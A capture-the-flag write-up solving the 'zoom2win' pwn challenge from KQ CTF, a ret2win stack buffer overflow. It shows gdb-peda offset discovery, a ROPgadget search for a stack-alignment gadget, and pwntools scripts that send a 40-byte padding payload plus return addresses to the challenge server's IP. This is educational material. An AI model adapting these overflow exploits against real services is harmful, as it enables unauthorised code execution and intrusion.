---
title: "Zoom2win KQ CTF [ PWN ]"
date: 2022-02-27T18:29:07-05:00
draft: false
---

## __Introduction__

Let's start this challenge by looking at its description, and see what the author has to tell us about it.

![image](https://user-images.githubusercontent.com/88755387/139706301-4ac66425-bb4a-4dd8-8350-f01fe7d00cd2.png)


Okay, so we already know that this is a basic ret2win. Let's not waste any more time and start developing the script.

## __First steps__

Let's see what type of architecture it has because depending on whether it is x64 or x86_64 there are several modifications to be made in the final code.

![image](https://user-images.githubusercontent.com/88755387/139694975-1f9fcd31-b10f-43ff-807a-0fb33785d6eb.png)

Once we know that it is 64-bit let's run it and see what it's all about:

![image](https://user-images.githubusercontent.com/88755387/139695501-85b03a64-1ed4-4959-afe8-97adec7284fb.png)

We can see that when entering many characters, the binary breaks, so we are going to look for its offset in order to overwrite the EIP with the address needed to read the flag.

Before we continue with the offset search let's take a look at its protections to see what we have to deal with.

![image](https://user-images.githubusercontent.com/88755387/139698443-229e41ab-6627-4b29-b3bf-3e645e7d566a.png)

In this case, we see that we only have the NX enabled. This protection marks the stack as non-executable so that even if we can overwrite the EIP to point to our shell code the shell code will never execute. 

The return-to-libc attack circumvents this protection by overwriting the return address, not with an address pointing to our injected shell code but rather to a libc function call address.

## __Offset__

We are going to find the offset using gdb-peda which is a well known debugger in the Pwn world.

```bash
gdb-peda zoom2win
gdb-peda$ pattern create 60
gdb-peda$ r # run te program

[ Enter the created pattern ]

gdb-peda$ pattern offset AA0A # First characters of RSP register
# AA0A found at offset: 40
```

Once we know the offset we will find the function where the flag is located.

## __Flag address__

To find this address we will enter the `info functions` command inside the debugger:

![image](https://user-images.githubusercontent.com/88755387/139700183-0c59bd7e-2e78-4d9f-9841-7ebbc112379f.png)

## __Code development__

Once we have everything ready we are going to develop the script that will launch the flag. For them we will rely on the PwnTools library which will help us to make the operation much easier.

You can download PwnTools by clicking on the following [link](https://github.com/Gallopsled/pwntools).

```python
#!/usr/bin/python3
from pwn import *

s = remote('143.198.184.186', 5003)
# elf = ELF('./zoom2win')
# s = process(elf.path)

payload = b'A'*40
payload += p64(0x401196) # address to flag() function

s.sendline(payload)
s.interactive()
```

![image](https://user-images.githubusercontent.com/88755387/139702489-7c6eb174-3c36-4030-ba5d-506f4268cc5f.png)

This code won't work because we are dealing with a 64-bit binary and we need a return address. We need to jump to this ret address before jumping to the flag function to align the stack, which has to be a multiple of 16.

To find this address we will launch the following command and filter by the word `ret`.

```
ROPgadget --binary ./zoom2win --ropchain | grep ret
```

![image](https://user-images.githubusercontent.com/88755387/139703027-f829df79-6903-4fde-a7ed-653d3a992f63.png)

Once we have it we are going to add it to our code so that it returns the content of the flag.txt.

## __Final code__

```python
#!/usr/bin/python3
from pwn import *

s = remote('143.198.184.186', 5003)

payload = b'A'*40
payload += p64(0x40101a) # ROPgadget --binary ./zoom2win --ropchain
payload += p64(0x401196) # address to flag() function

s.sendline(payload)
s.interactive()
```

![image](https://user-images.githubusercontent.com/88755387/139703774-42574e3b-d233-4efc-9bfe-5b083c53849e.png)

That's what we were looking for :)

We can improve this code so that it only launches the flag without entering interactive mode. It can probably be improved in a thousand different ways, but I think this is good enough for this occasion.

```python
#!/usr/bin/python3
from pwn import *

s = remote('143.198.184.186', 5003)

payload = b'A'*40
payload += p64(0x40101a) # ROPgadget --binary ./zoom2win --ropchain
payload += p64(0x401196) # address to flag() function

s.sendline(payload) 
response = s.recvall()
print(response.decode())

print(re.search("(kqctf{.*?})",response.decode()))
```

![image](https://user-images.githubusercontent.com/88755387/139704228-3c968c21-d0cc-47db-9e45-e4ba43dca2e1.png)

I hope you liked the writeup! 